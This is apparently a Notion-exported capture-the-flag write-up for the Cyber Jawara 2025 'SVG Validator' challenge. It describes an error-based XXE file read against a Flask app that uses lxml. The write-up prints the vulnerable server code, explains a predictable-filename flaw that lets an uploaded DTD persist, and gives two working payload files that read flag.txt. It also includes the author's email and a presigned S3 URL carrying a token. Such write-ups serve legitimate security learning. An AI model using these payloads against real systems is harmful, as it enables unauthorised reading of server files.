---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466YL36LWYX%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T100950Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJIMEYCIQCUzj1Z3mbLjHLQVL4g%2BHcXe8%2F%2BDSo7qKix3HpJqSBxUQIhAOrZYvR33UHXghZ%2B3veE1bENnL%2BFxzEv6l4DgP0elOzMKogECOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxnEYHQRMiL4XEXcAAq3AMIkZ10I90jIsUq3ihb83G3xf8gU7EiGmWm1fK3rlSJ8Knj0Zw7%2FaRZARt5ueCAyJTMaD0tBxV5TG36S5OyUkmmIn%2F3b0UhzHPpYrVRAoA1tyZOzzfuwMDcMI5mxouMCljSmqcOE1RIfdzUymEcTQKGCnHM7je4o%2BE49DT5kFlgdS4O8g1OWAD9yB87hyee9F88vFhPukm4jN6F8nBuAYEWZXfmp1MHf3J1ZukYqqnQ9%2FjICaQ%2BBYhhEE8ymiEaKDsZ2OctPWuIYh47cDkpZcIgcPwsnjwsfVb5WpiK77n%2BdRE%2FsKTAs5f8Pil60ftTFi4DE2M7yHSzsNMZd5cPVqTqHRtea9Pzv78EltSZD7Xarn0BR6%2BMbgwg3PleBqbNPnF2JE7RHg1k4oSQir5kL64C%2FPO4eT%2Fy8diijwfqnrQYn3JMqeOM5ANBg1U4fRq0Wvx3WbHgiZTow4%2Bb3Oh%2BgMzKTnij8S8tK6Dm9REU5dxKUujLgz6Fc2OhosaNiiHaaeJiWZa5ojMdwuaXlN0bxIAi73HG%2FR40Ytk8qcEM%2B9UcY15DLJpmgtadK3wHLwBVGXp%2Fb9aJfyEQGEc5tDgvA4JuA24nzmsEJ0YV7DWfdT7YS0Yy38wPCx%2BjNU56iDDMi8HBBjqkAVXTnzVoiQpBmyXp1bMkOqd3eiUZVhYkK7zK1b7oHoHNBClgZcKJXuKsZv2PXovp4EO5tDa%2BFOGiHYewRKDFg11D23LkHJP6WRepxlP1xavu%2B%2BGJYDXrEHmf1m1ZGb4urb8XCIfwtFZFVr5JzKMo0I%2Fg8W9TkWOiKUldN3eJ4VXNv%2BcD0Lmg3a%2Ff%2BANroyScu%2BNJMzKrxtB5MzbkjqBkmYG1b%2B%2B4\&X-Amz-Signature=adb12375c4cdf520068a8ec8d2d3089c28686ecce987bb06e50df1c824172ff2\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
